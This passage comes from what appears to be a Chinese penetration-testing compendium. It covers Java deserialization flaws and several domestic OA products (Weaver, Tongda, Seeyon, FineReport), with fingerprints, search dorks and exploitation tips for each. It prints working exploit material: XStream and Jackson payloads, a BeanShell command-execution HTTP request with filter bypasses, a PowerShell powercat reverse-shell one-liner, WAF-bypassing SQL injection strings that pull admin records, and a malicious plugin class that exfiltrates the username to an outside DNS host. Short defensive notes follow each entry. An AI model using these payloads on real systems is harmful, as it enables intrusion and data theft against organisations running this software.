新增了safemode, 彻底关闭autotype)<br>2.WAF拦截过滤请求包中的 @type, %u0040%u0074%u0079%u0070%u0065, \u0040type, \x04type 等多种编码的autotype变形<br>3.最少升级到1.2.48以上版本且关闭autotype选项<br>4.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p><h1 id="Jackson-反序列化远程代码执行漏洞"><a href="#Jackson-反序列化远程代码执行漏洞" class="headerlink" title="Jackson 反序列化远程代码执行漏洞"></a>Jackson 反序列化远程代码执行漏洞</h1><ol><li>漏洞简介<br>Jackson 跟Fastjson一样, 当enableDefaultTyping开启时, 也是可以进行反序列化到代码执行</li><li>影响组件<br>Jackson</li><li>漏洞指纹<br>无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (&lt;1.2.60)<br><a href="https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/">https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/</a></li><li>Fofa Dork</li><li>漏洞分析<br>跟Fastjson漏洞原理都是一样的, 每次修复基本都是更新黑名单, 漏洞分析可以参考<br>Jackson-databind-2670远程代码执行漏洞简单分析 – 先知社区<br><a href="https://xz.aliyun.com/t/7506">https://xz.aliyun.com/t/7506</a></li><li>漏洞利用<br>learnjavabug/jackson/src/main/java/com/threedr3am/bug/jackson at master · threedr3am/learnjavabug<br><a href="https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson">https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson</a><br>POC</li></ol><pre><code>    [&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;, &#123;&quot;jndiLocation&quot;:&quot;ldap://localhost:43658/Calc&quot;&#125;]</code></pre><ol start="7"><li><p>利用技巧</p></li><li><p>把Fastjson的利用链拿过来改一改就可以用, 前提是环境中存在可用的利用链</p></li><li><p>防护方法</p></li><li><p>升级Jackson到最新版(enableDefaultTyping默认都是关的, 问题不大)</p></li><li><p>确保enableDefaultTyping是关闭的</p></li><li><p>升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p><h1 id="Xstream-反序列化漏洞"><a href="#Xstream-反序列化漏洞" class="headerlink" title="Xstream 反序列化漏洞"></a>Xstream 反序列化漏洞</h1></li><li><p>漏洞简介<br>Xstream Java 中经常用于处理 xml 的库, 最近一次修复中(1.4.10版本)重现了历史反序列化远程代码执行漏洞, 所以也需要关注</p></li><li><p>影响组件<br>Xstream &lt;1.4.6, =1.4.10</p></li><li><p>漏洞指纹<br>xml</p></li><li><p>Fofa Dork</p></li><li><p>漏洞分析<br>XStream反序列化组件攻击分析 | angelwhu_blog<br><a href="https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins%EF%BF%A5%EF%BE%88%EF%BE%A9%EF%BF%A7%EF%BE%94%EF%BE%A8">https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ</a></p></li><li><p>漏洞利用<br>XStream反序列化组件攻击分析 | angelwhu_blog<br><a href="https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins%EF%BF%A5%EF%BE%88%EF%BE%A9%EF%BF%A7%EF%BE%94%EF%BE%A8">https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ</a></p></li></ol><pre><code>import com.thoughtworks.xstream.XStream;import java.io.IOException;public class Main &#123;// POC1    public static void main(String[] args) throws IOException &#123;            XStream xStream = new XStream();            String payload = &quot;&lt;sorted-set&gt;\n&quot; +                    &quot;    &lt;string&gt;foo&lt;/string&gt;\n&quot; +                    &quot;    &lt;dynamic-proxy&gt;\n&quot; +                    &quot;    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot; +                    &quot;        &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot; +                    &quot;            &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot; +                    &quot;                &lt;command&gt;\n&quot; +                    &quot;                    &lt;string&gt;cmd.exe&lt;/string&gt;\n&quot; +                    &quot;                    &lt;string&gt;/c&lt;/string&gt;\n&quot; +                    &quot;                    &lt;string&gt;calc&lt;/string&gt;\n&quot; +                    &quot;                &lt;/command&gt;\n&quot; +                    &quot;            &lt;/target&gt;\n&quot; +                    &quot;     &lt;action&gt;start&lt;/action&gt;&quot;+                    &quot;        &lt;/handler&gt;\n&quot; +                    &quot;    &lt;/dynamic-proxy&gt;\n&quot; +                    &quot;&lt;/sorted-set&gt;\n&quot;;//POC2//        String payload = &quot;&lt;java.util.PriorityQueue serialization=\&quot;custom\&quot;&gt;\n&quot; +//                &quot;  &lt;unserializable-parents/&gt;\n&quot; +//                &quot;  &lt;java.util.PriorityQueue&gt;\n&quot; +//                &quot;    &lt;default&gt;\n&quot; +//                &quot;      &lt;size&gt;2&lt;/size&gt;\n&quot; +//                &quot;      &lt;comparator class=\&quot;org.apache.commons.beanutils.BeanComparator\&quot;&gt;\n&quot; +//                &quot;        &lt;property&gt;databaseMetaData&lt;/property&gt;\n&quot; +//                &quot;        &lt;comparator class=\&quot;java.util.Collections$ReverseComparator\&quot;/&gt;\n&quot; +//                &quot;      &lt;/comparator&gt;\n&quot; +//                &quot;    &lt;/default&gt;\n&quot; +//                &quot;    &lt;int&gt;3&lt;/int&gt;\n&quot; +//                &quot;    &lt;com.sun.rowset.JdbcRowSetImpl serialization=\&quot;custom\&quot;&gt;\n&quot; +//                &quot;      &lt;javax.sql.rowset.BaseRowSet&gt;\n&quot; +//                &quot;        &lt;default&gt;\n&quot; +//                &quot;          &lt;concurrency&gt;1008&lt;/concurrency&gt;\n&quot; +//                &quot;          &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;\n&quot; +//                &quot;          &lt;fetchDir&gt;1000&lt;/fetchDir&gt;\n&quot; +//                &quot;          &lt;fetchSize&gt;0&lt;/fetchSize&gt;\n&quot; +//                &quot;          &lt;isolation&gt;2&lt;/isolation&gt;\n&quot; +//                &quot;          &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;\n&quot; +//                &quot;          &lt;maxRows&gt;0&lt;/maxRows&gt;\n&quot; +//                &quot;          &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;\n&quot; +//                &quot;          &lt;readOnly&gt;true&lt;/readOnly&gt;\n&quot; +//                &quot;          &lt;rowSetType&gt;1004&lt;/rowSetType&gt;\n&quot; +//                &quot;          &lt;showDeleted&gt;false&lt;/showDeleted&gt;\n&quot; +//                &quot;          &lt;dataSource&gt;ldap://ip:1389/Object&lt;/dataSource&gt;\n&quot; +//                &quot;          &lt;params/&gt;\n&quot; +//                &quot;        &lt;/default&gt;\n&quot; +//                &quot;      &lt;/javax.sql.rowset.BaseRowSet&gt;\n&quot; +//                &quot;      &lt;com.sun.rowset.JdbcRowSetImpl&gt;\n&quot; +//                &quot;        &lt;default&gt;\n&quot; +//                &quot;          &lt;iMatchColumns&gt;\n&quot; +//                &quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot; +//                &quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot; +//                &quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot; +//                &quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot; +//                &quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot; +//                &quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot; +//                &quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot; +//                &quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot; +//                &quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot; +//                &quot;            &lt;int&gt;-1&lt;/int&gt;\n&quot; +//                &quot;          &lt;/iMatchColumns&gt;\n&quot; +//                &quot;          &lt;strMatchColumns&gt;\n&quot; +//                &quot;            &lt;string&gt;foo&lt;/string&gt;\n&quot; +//                &quot;            &lt;null/&gt;\n&quot; +//                &quot;            &lt;null/&gt;\n&quot; +//                &quot;            &lt;null/&gt;\n&quot; +//                &quot;            &lt;null/&gt;\n&quot; +//                &quot;            &lt;null/&gt;\n&quot; +//                &quot;            &lt;null/&gt;\n&quot; +//                &quot;            &lt;null/&gt;\n&quot; +//                &quot;            &lt;null/&gt;\n&quot; +//                &quot;            &lt;null/&gt;\n&quot; +//                &quot;          &lt;/strMatchColumns&gt;\n&quot; +//                &quot;        &lt;/default&gt;\n&quot; +//                &quot;      &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n&quot; +//                &quot;    &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n&quot; +//                &quot;    &lt;com.sun.rowset.JdbcRowSetImpl reference=\&quot;../com.sun.rowset.JdbcRowSetImpl\&quot;/&gt;\n&quot; +//                &quot;  &lt;/java.util.PriorityQueue&gt;\n&quot; +//                &quot;&lt;/java.util.PriorityQueue&gt;&quot;;        xStream.fromXML(payload);    &#125;&#125;</code></pre><ol start="7"><li><p>利用技巧</p></li><li><p>这里 Xstream 同样影响很多使用它的开源组件, 比如Spring系列<br>Maven Repository: com.thoughtworks.xstream » xstream » 1.4.10 (Usages)<br><a href="https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream/1.4.10/usages">https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream/1.4.10/usages</a></p></li><li><p>xml 不仅可以xxe, 还能反序列化代码执行</p></li><li><p>xxe 漏洞用 xxer, 方便快捷<br>TheTwitchy/xxer: A blind XXE injection callback handler. Uses HTTP and FTP to extract information. Originally written in Ruby by ONsec-Lab.<br><a href="https://github.com/TheTwitchy/xxer">https://github.com/TheTwitchy/xxer</a></p></li><li><p>防护方法</p></li><li><p>升级到最新版</p><h1 id="泛微OA-Bsh-远程代码执行漏洞"><a href="#泛微OA-Bsh-远程代码执行漏洞" class="headerlink" title="泛微OA Bsh 远程代码执行漏洞"></a>泛微OA Bsh 远程代码执行漏洞</h1></li><li><p>漏洞简介<br>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.</p></li><li><p>影响组件<br>泛微OA</p></li><li><p>漏洞指纹<br>Set-Cookie: ecology_JSessionId=<br>ecology<br>/weaver/bsh.servlet.BshServlet</p></li><li><p>Fofa Dork<br>app=”泛微-协同办公OA”</p></li><li><p>漏洞分析<br>泛微OA E-cology远程代码执行漏洞原理分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/215218.html">https://www.freebuf.com/vuls/215218.html</a><br><a href="https://github.com/beanshell/beanshell">https://github.com/beanshell/beanshell</a><br><a href="http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI">http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI</a></p></li><li><p>漏洞利用<br>Vulnerability-analysis/0917/weaver-oa/CNVD-2019-32204 at master · myzing00/Vulnerability-analysis<br><a href="https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204">https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204</a></p></li></ol><pre><code>POST /weaver/bsh.servlet.BshServlet HTTP/1.1Host: xxxxxxxx:8088Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Length: 98Content-Type: application/x-www-form-urlencodedbsh.script=eval%00(&quot;ex&quot;%2b&quot;ec(\&quot;whoami\&quot;)&quot;);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw</code></pre><ol start="7"><li>利用技巧</li><li>其他形式绕过</li></ol><pre><code>    eval%00(&quot;ex&quot;%2b&quot;ec(\&quot;whoami\&quot;)&quot;); 也可以换成 ex\u0065c(&quot;cmd /c dir&quot;);</code></pre><p>2.泛微多数都是windows环境, 反弹shell可以使用pcat</p><pre><code>    powershell IEX(New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c ip -p 6666 -e cmd</code></pre><ol start="8"><li><p>防护方法</p></li><li><p>及时更新泛微补丁</p></li><li><p>拦截/weaver/bsh.servlet.BshServlet目录的访问</p><h1 id="泛微OA-e-cology-SQL注入漏洞"><a href="#泛微OA-e-cology-SQL注入漏洞" class="headerlink" title="泛微OA e-cology SQL注入漏洞"></a>泛微OA e-cology SQL注入漏洞</h1></li><li><p>漏洞简介<br>泛微OA 在国内的用户很多, 漏洞以前也很多, 但现在在漏洞盒子托管了企业SRC <a href="https://weaversrc.vulbox.com/">https://weaversrc.vulbox.com/</a>, 情况有所好转</p></li><li><p>影响组件<br>泛微OA</p></li><li><p>漏洞指纹<br>Set-Cookie: ecology_JSessionId=<br>ecology<br>WorkflowCenterTreeData<br>/mobile/plugin/SyncUserInfo.jsp</p></li><li><p>Fofa Dork<br>app=”泛微-协同办公OA”</p></li><li><p>漏洞分析<br>泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库) – 先知社区<br><a href="https://xz.aliyun.com/t/6531">https://xz.aliyun.com/t/6531</a></p></li><li><p>漏洞利用<br>泛微OA e-cology WorkflowCenterTreeData前台接口SQL注入漏洞复现数据库小龙人-CSDN博客<br><a href="https://blog.csdn.net/zycdn/article/details/102494037">https://blog.csdn.net/zycdn/article/details/102494037</a><br>Tentacle/ecology8_mobile_sql_inject.py at 6e1cecd52b10526c4851a26249339367101b3ca2 · orleven/Tentacle<br><a href="https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py">https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py</a><br>应用安全 – 软件漏洞 – 泛微OA漏洞汇总 – AdreamWillB – 博客园<br><a href="https://www.cnblogs.com/AtesetEnginner/p/11558469.html">https://www.cnblogs.com/AtesetEnginner/p/11558469.html</a><br>/mobile/plugin/SyncUserInfo.jsp 这个也是有问题的, 但由于没有公开的分析报告, 漏洞相对简单, 这里不过多描述</p></li><li><p>利用技巧</p></li><li><p>在这个漏洞补丁之前大概有几十个前台注入, 都差不多, 因为没公开这里就不细说了</p></li><li><p>泛微的补丁中间改过一次过滤策略, 打完所有补丁的话, 注入就很难了</p></li><li><p>这里可以绕过的原因是泛微某个过滤器初始化错误, 当长度超过xssMaxLength=500的时候就不进入安全检测, 修复以后是xssMaxLength=1000000, 所以随便你填充%0a%0d还是空格都可以绕过注入检测</p></li><li><p>泛微后端数据库版本存在差异, 但是可以通用检测<br>已知泛微OA E8存在2个版本的数据库, 一个是mssql, 一个是oracle, 且新旧版本泛微的sql过滤方法并不一致<br>所以这里筛选出一个相对通用的检测手法(下面代码是python的” “*800 800个空格)</p></li></ol><pre><code>    &quot;-1) &quot;+&quot; &quot;*800+ &quot;union select/**/1, Null, Null, Null, Null, Null, Null, Null from Hrmresourcemanager where loginid=(&#39;sysadmin&#39;&quot;</code></pre><p>老版本可以在关键字后面加 /**/ 来绕过sql检测<br>新版本可以通过加入大量空格/换行来绕过sql检测<br>mssql, oracle中都有Hrmresourcemanager , 这是管理员信息表<br>就Hrmresource表中没有用户, Hrmresourcemanager 表中也一定会存在sysadmin账户<br>所以进行union select的时候一定会有数据<br>这里也可以使用 </p><pre><code>    &quot;-1) &quot;+&quot; &quot;*800+ &quot; or/**/ 1=1 and id&lt;(5&quot;</code></pre><p>这里使用 &lt;5 可以避免信息超过5条, 但是会返回密码等敏感信息, 不建议使用<br>8. 防护方法<br>1.及时更新泛微补丁<br>2.泛微最好不要开放到公网<br>3.使用waf拦击</p><h1 id="泛微OA-数据库泄露漏洞"><a href="#泛微OA-数据库泄露漏洞" class="headerlink" title="泛微OA 数据库泄露漏洞"></a>泛微OA 数据库泄露漏洞</h1><ol><li><p>漏洞简介<br>泛微OA 在国内的用户很多, 漏洞以前也很多, 但现在在漏洞盒子托管了企业SRC <a href="https://weaversrc.vulbox.com/">https://weaversrc.vulbox.com/</a>, 情况有所好转</p></li><li><p>影响组件<br>泛微OA</p></li><li><p>漏洞指纹<br>Set-Cookie: ecology_JSessionId=<br>ecology<br>/mobile/DBconfigReader.jsp</p></li><li><p>Fofa Dork<br>app=”泛微-协同办公OA”</p></li><li><p>漏洞分析<br>jas502n/DBconfigReader: 泛微ecology OA系统接口存在数据库配置信息泄露漏洞<br><a href="https://github.com/jas502n/DBconfigReader">https://github.com/jas502n/DBconfigReader</a></p></li><li><p>漏洞利用<br>linbing/Weaver_Ecology_Oa_Config.py at master · taomujian/linbing<br><a href="https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py">https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py</a></p></li><li><p>利用技巧</p></li><li><p>虽然是接口返回数据是加密的, 但是因为硬编码密钥的缘故, 解密也很简单, pydes就可以解密, 只是这里pydes本身有个bug, 修复方式 pyDes.des(‘ ‘)</p></li><li><p>这里解密出来的密码一般都是泛微默认的, 且数据库监听在127.0.0.1上, 用处看个人发挥了</p></li><li><p>此外泛微还有一些漏洞, 但是基本最新版都修复了, 由于没公开过, 就让他消失吧</p></li><li><p>防护方法</p></li><li><p>及时更新泛微补丁</p></li><li><p>泛微最好不要开放到公网</p></li><li><p>使用waf拦截sql注入</p><h1 id="通达OA-远程代码执行漏洞"><a href="#通达OA-远程代码执行漏洞" class="headerlink" title="通达OA 远程代码执行漏洞"></a>通达OA 远程代码执行漏洞</h1></li><li><p>漏洞简介<br>通达OA 在国内的用户也比较多, 虽说代码加了密, 奈何是Zend5.4, 解码很简单, 然后代码中的漏洞就很清楚, 尤其是变量覆盖和注入</p></li><li><p>影响组件<br>通达OA</p></li><li><p>漏洞指纹<br>“/images/tongda.ico”&gt;<br>Office Anywhere 20xx版 网络智能办公系统<br>/ispirit/interface/gateway.php</p></li><li><p>Fofa Dork<br>app=”通达OA”</p></li><li><p>漏洞分析<br>note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note<br><a href="https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md">https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md</a><br>代码审计 | 通达OA 任意用户登录漏洞（匿名RCE）分析 | zrools<br><a href="https://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/">https://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/</a></p></li><li><p>漏洞利用<br>note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note<br><a href="https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md">https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md</a><br>NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞<br><a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a><br>tools/tongda_v11.4_rce_exp.py at master · zrools/tools 管理员伪造后sql写shell<br><a href="https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py">https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py</a></p></li><li><p>利用技巧</p></li><li><p>这个漏洞也很简单, 发预警的当天就分析出来了, 一个上传, 一个包含, 主要是文件包含漏洞的/ispirit/interface/gateway.php文件在v11才有<br>绕过disable_function也很简单, 直接调用COM(‘WScript.shell’)组件就ok了</p></li><li><p>文件名结构规则如下</p></li></ol><pre><code>    256@2003_ 2055499620|123. php.</code></pre><p>对应文件名为</p><pre><code>    attach/im/2003/2055499620.123.php</code></pre><p>因为是windows的, 1.php. 可以绕过黑名单, 写到文件就成了 1.php (这里是文件包含, 文件名无所谓)<br>3.2020年4月20号爆出任意用户伪造登录, 这里小伙伴测试 2017 和 v11 的 poc 好像可以用同一个<br>(我们看标题挖漏洞, 全网第一时间推送了带复现截图的漏洞通告, 也引发了大家不少讨论)<br>通达OA前台任意用户伪造登录漏洞<br><a href="https://vas.riskivy.com/vuln-detail?id=33">https://vas.riskivy.com/vuln-detail?id=33</a><br>NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞<br><a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a><br>8. 防护方法<br>1.及时更新补丁<br>2.使用waf拦截</p><h1 id="致远-OA-A8-htmlofficeservlet-getshell-漏洞"><a href="#致远-OA-A8-htmlofficeservlet-getshell-漏洞" class="headerlink" title="致远 OA A8 htmlofficeservlet getshell 漏洞"></a>致远 OA A8 htmlofficeservlet getshell 漏洞</h1><ol><li>漏洞简介<br>致远 OA 在国内的用户也比较多, 2019年攻防演练暴出来 htmlofficeservlet getshell 漏洞</li><li>影响组件<br>致远 OA</li><li>漏洞指纹<br>/seeyon/htmlofficeservlet<br>/seeyon/index.jsp<br>seeyon</li><li>Fofa Dork<br>app=”用友-致远OA”</li><li>漏洞分析<br>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) – Reber’s Blog<br><a href="http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/">http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</a></li><li>漏洞利用<br>timwhitez/seeyon-OA-A8-GetShell: 致远OA A8 某些版本批量getshell漏洞/seeyon OA A8 some version getshell from url list<br><a href="https://github.com/timwhitez/seeyon-OA-A8-GetShell">https://github.com/timwhitez/seeyon-OA-A8-GetShell</a><br>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) – Reber’s Blog<br><a href="http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/">http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</a><br>这里还有个XXE<br>致远OA帆软报表组件前台XXE漏洞(0day)挖掘过程 LandGrey’s Blog<br><a href="https://landgrey.me/blog/8/">https://landgrey.me/blog/8/</a></li><li>利用技巧</li><li>这个漏洞也挺有意思的, 这个接口是一个金格iweboffice用来处理文件的, 属于一个第三方接口暴露导致的安全问题<br>这个漏洞网传的脚本都是一个文件名test123456.jsp, 很容易被人锤啊<br>这里贴一个小脚本可以加解密文件名属性之类的, 算法也很简单, 漏洞通告的当天就写出来了, 就是一个换了码表的base64</li></ol><pre><code>    from sys import argvletters = &quot;gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6&quot;def base64_encode(input_str):    str_ascii_list = [&#39;&#123;:0&gt;8&#125;&#39;.format(str(bin(ord(i))).replace(&#39;0b&#39;, &#39;&#39;))                      for i in input_str]    output_str = &#39;&#39;    equal_num = 0    while str_ascii_list:        temp_list = str_ascii_list[:3]        if len(temp_list) != 3:            while len(temp_list) &lt; 3:                equal_num += 1                temp_list += [&#39;0&#39; * 8]        temp_str = &#39;&#39;.join(temp_list)        temp_str_list = [temp_str[x:x + 6] for x in [0, 6, 12, 18]]        temp_str_list = [int(x, 2) for x in temp_str_list]        if equal_num:            temp_str_list = temp_str_list[0:4 - equal_num]        output_str += &#39;&#39;.join([letters[x] for x in temp_str_list])        str_ascii_list = str_ascii_list[3:]    output_str = output_str + &#39;=&#39; * equal_num    return output_strdef base64_decode(input_str):    str_ascii_list = [&#39;&#123;:0&gt;6&#125;&#39;.format(str(bin(letters.index(i))).replace(&#39;0b&#39;, &#39;&#39;))                      for i in input_str if i != &#39;=&#39;]    output_str = &#39;&#39;    equal_num = input_str.count(&#39;=&#39;)    while str_ascii_list:        temp_list = str_ascii_list[:4]        temp_str = &#39;&#39;.join(temp_list)        if len(temp_str) % 8 != 0:            temp_str = temp_str[0:-1 * equal_num * 2]        temp_str_list = [temp_str[x:x + 8] for x in [0, 8, 16]]        temp_str_list = [int(x, 2) for x in temp_str_list if x]        output_str += &#39;&#39;.join([chr(x) for x in temp_str_list])        str_ascii_list = str_ascii_list[4:]    return output_strif __name__ == &quot;__main__&quot;:    if len(argv) == 2:        print(base64_decode(argv[1]))    elif len(argv) == 3:        if argv[1] == &#39;-d&#39;:            print(base64_decode(argv[2]))        else:            print(base64_encode(argv[2]))    else:        print(&quot;Seeyon OA /seeyon/htmlofficeservlet param encode/decode&quot;)        print(&quot;Usage:&quot;)        print(&quot;python %s encoded_str&quot; % argv[0])t        print(&quot;python %s -d encoded_str&quot; % argv[0])        print(&quot;python %s -e raw_str&quot; % argv[0])</code></pre><ol start="8"><li><p>防护方法</p></li><li><p>及时更新补丁</p></li><li><p>使用waf拦截</p><h1 id="致远OA-帆软报表-seeyonreport-远程代码执行"><a href="#致远OA-帆软报表-seeyonreport-远程代码执行" class="headerlink" title="[致远OA] 帆软报表 seeyonreport 远程代码执行"></a>[致远OA] 帆软报表 seeyonreport 远程代码执行</h1></li><li><p>漏洞简介<br>帆软报表 (seeyonreport) 很多时候会跟合致远OA一起出现, 通常用户还不知道, 所以这里有几个漏洞点</p></li><li><p>影响组件<br>帆软报表 seeyonreport</p></li><li><p>漏洞指纹<br><a href="https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892">https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892</a><br>seeyonreport</p></li><li><p>Fofa Dork<br>app=”用友-致远OA”</p></li><li><p>漏洞分析<br>帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog<br><a href="http://foreversong.cn/archives/1378">http://foreversong.cn/archives/1378</a></p></li><li><p>漏洞利用<br>帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog<br><a href="http://foreversong.cn/archives/1378">http://foreversong.cn/archives/1378</a><br>xray/finereport-directory-traversal.yml at master · chaitin/xray<br><a href="https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml">https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml</a></p></li><li><p>利用技巧</p></li><li><p>未设置密码或者读取读取管理员密码<br><a href="https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892">https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892</a><br>这里很有可能是没有设置密码的, 修改密码进入后台就可以了<br>如果设置里密码, 尝试这个接口 /report/ReportServer?op=chart&amp;cmd=get_geo_json&amp;resourcepath=privilege.xml, 读取管理员密码, 然后使用上文的解密程序解密</p></li><li><p>后台getshell<br>这种后台能装插件的都随便getshell</p></li></ol><p>先去下载一个指定版本的jar包</p><p>本地测试环境是9.0</p><p>下载com.fr.plugin.external-1.3.4.zip<br><a href="https://shop.finereport.com/plugin/2d36b210-2a59-4940-8c4f-f3f16d58cd66">https://shop.finereport.com/plugin/2d36b210-2a59-4940-8c4f-f3f16d58cd66</a></p><p><a href="http://shopps.finereport.com/com.fr.plugin.external-1.3.4.zip?e=1561433162&amp;token=GYG9vMioxqbEgx-5HoAMAelD0zGdUrXT4UZ3w-d1:N-PeIkhKkjCY7LHdqelnSvp_LmA=">http://shopps.finereport.com/com.fr.plugin.external-1.3.4.zip?e=1561433162&amp;token=GYG9vMioxqbEgx-5HoAMAelD0zGdUrXT4UZ3w-d1:N-PeIkhKkjCY7LHdqelnSvp_LmA=</a></p><p>编译一个恶意的class打包进去</p><pre><code>package com.fr.plugin.external.locale;import java.io.IOException;import java.lang.Runtime;import java.lang.Process;public class LocaleFinder &#123;    public LocaleFinder() throws IOException, InterruptedException &#123;        String[] commands; if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;)) &#123;            commands = new String[]&#123;&quot;C:\\Windows\\System32\\cmd&quot;, &quot;/c&quot;, &quot;ping -nc 3 %username%.win.seeyonreport.ceyedoamin.ceye.io&quot;&#125;; &#125;        else &#123;            commands = new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;curl `whoami`.linux.seeyonreport.ceyedoamin.ceye.io&quot;&#125;; &#125;        Runtime rt = Runtime.getRuntime(); Process pc = 